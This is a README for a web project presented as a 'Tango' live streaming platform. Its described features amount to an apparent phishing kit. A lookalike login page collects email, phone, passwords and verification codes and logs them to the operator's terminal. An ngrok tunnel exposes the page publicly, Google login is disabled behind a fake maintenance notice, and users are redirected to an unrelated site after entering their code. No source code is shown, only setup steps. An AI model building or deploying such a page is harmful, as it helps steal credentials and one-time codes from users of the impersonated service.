# Tango Live Streaming Platform

A modern live streaming platform built with React, TypeScript, and Tailwind CSS.

## Features

- 🎥 **Live Streaming Interface** - Beautiful, responsive design inspired by Tango
- 📧 **Email/Phone Login** - Multiple authentication options
- 📸 **Image Upload** - Profile image upload with preview
- 🌐 **Ngrok Integration** - Public URL access for testing
- 📊 **Terminal Logging** - All form inputs logged to console
- 🎨 **Modern UI** - Glassmorphism design with smooth animations

## Quick Start

### Option 1: Automated Setup (Recommended)

**Windows (PowerShell):**
```powershell
.\start-dev.ps1
```

**Windows (Command Prompt):**
```cmd
start-dev.bat
```

**Linux (with separate terminal windows):**
```bash
./start-dev.sh
```

**Linux (single terminal):**
```bash
./start-dev-terminal.sh
```

**Universal (Windows/Linux/macOS):**
```bash
node start-dev-universal.js
```

**Using npm scripts (any platform):**
```bash
npm start
```

### Option 2: Manual Setup

1. **Install Frontend Dependencies:**
   ```bash
   npm install
   ```

2. **Start Backend Server:**
   ```bash
   cd server
   npm install
   npm start
   ```

3. **Start Frontend Server (in a new terminal):**
   ```bash
   npm run dev
   ```

### Linux Setup Notes

**Make scripts executable (first time only):**
```bash
chmod +x start-dev.sh start-dev-terminal.sh
```

**If you don't have gnome-terminal (for start-dev.sh):**
- Install it: `sudo apt install gnome-terminal` (Ubuntu/Debian)
- Or use the single terminal version: `./start-dev-terminal.sh`
- Or manually run the commands in separate terminals

**Alternative terminal emulators:**
- Replace `gnome-terminal` with `xterm`, `konsole`, or `xfce4-terminal` in `start-dev.sh`

## How It Works

1. **Frontend** runs on `http://localhost:5173`
2. **Backend** runs on `http://localhost:3001`
3. **Ngrok** provides a public URL (displayed in backend terminal)
4. **Image Upload** - Users can upload profile images during login
5. **Terminal Logging** - All form submissions are logged to the backend terminal

## Testing the Verification Feature

1. **Start the backend server:**
   ```bash
   cd server
   npm install
   npm start
   ```

2. **Start the frontend server:**
   ```bash
   npm run dev
   ```

3. **Test the verification flow:**
   - Open the application in your browser
   - Click "Continue with Email" or "Continue with Phone"
   - Enter an email address or phone number
   - Click "Continue" - the verification page should appear
   - Enter any 4-digit verification code
   - Click "Verify Code" - the code will be displayed in the terminal and you'll be redirected to https://student-lookup-beta.vercel.app
   - Check the backend terminal for logged data

4. **Google Login:**
   - Google login is currently under maintenance
   - Clicking the Google button will show a maintenance message
   - Use email or phone login instead

## Troubleshooting

**If verification page doesn't show:**
1. Check browser console for errors
2. Make sure backend server is running on port 3001
3. Use the "Debug: Show Verification" button to test the UI
4. Check network tab in browser dev tools for failed API calls

**Backend not starting:**
1. Make sure you're in the server directory: `cd server`
2. Install dependencies: `npm install`
3. Start server: `npm start`
4. Check for port conflicts (make sure port 3001 is available)

**Ngrok not working:**
1. Run the ngrok setup helper: `npm run setup:ngrok`
2. Or install ngrok manually: `cd server && npm install ngrok@^4.3.3`
3. For custom subdomain, get authtoken from: https://dashboard.ngrok.com/get-started/your-authtoken
4. Configure authtoken: `npx ngrok config add-authtoken YOUR_TOKEN`
5. Or run ngrok manually: `npx ngrok http 3001`

## Project Structure

```
├── src/
│   ├── components/
│   │   ├── LoginModal.tsx    # Updated with image upload
│   │   ├── Header.tsx        # Updated with TangoLogo
│   │   ├── MenuDropdown.tsx
│   │   ├── ProfileCarousel.tsx # Updated with TangoIcon
│   │   ├── VideoBackground.tsx
│   │   ├── TangoLogo.tsx     # Main logo component
│   │   └── TangoIcon.tsx     # Icon component
│   ├── App.tsx
│   └── main.tsx
├── server/
│   ├── server.js            # Backend with Ngrok
│   ├── package.json
│   └── uploads/             # Image storage
└── start-dev.ps1           # Development setup script
```

## Technologies Used

- **Frontend:** React, TypeScript, Tailwind CSS, Vite
- **Backend:** Node.js, Express, Multer
- **Tunneling:** Ngrok
- **Icons:** Lucide React

## API Endpoints

- `POST /api/upload` - Handle form submission with image upload
- `GET /api/health` - Health check
- `GET /uploads/:filename` - Serve uploaded images

## Development Notes

- All form data (email, phone, password) is logged to the backend terminal
- Images are stored in `server/uploads/` with unique filenames
- Ngrok tunnel provides public access for testing
- File size limit: 5MB
- Supported image formats: All standard image types
